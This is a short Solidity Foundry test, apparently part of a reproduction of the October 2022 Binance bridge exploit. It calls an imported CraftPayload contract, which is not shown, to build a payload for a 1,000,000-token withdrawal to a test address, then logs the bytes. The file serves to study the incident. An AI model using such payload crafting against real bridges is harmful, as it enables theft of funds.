// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../../src/binance-october-2022/CraftPayload.sol";

contract BinanceAttackerTest is Test {
    using stdStorage for StdStorage;

    CraftPayload public craftPayload;

    address inputAddress = makeAddr("Alice"); // random Address

    function setUp() public {

    }

    function testRun()public {
        craftPayload = new CraftPayload();
        console.log("Address = ", inputAddress);
        address tokenAddress = address(0);
        uint256 amount = 1_000_000*1e18;
        address recipient = inputAddress;
        uint256 expireTime = block.timestamp + 6400;
        bytes memory payload = craftPayload.craftPayload(tokenAddress, amount, recipient, expireTime);
        console.log("Payload = ");
        console.logBytes(payload);
    }
}
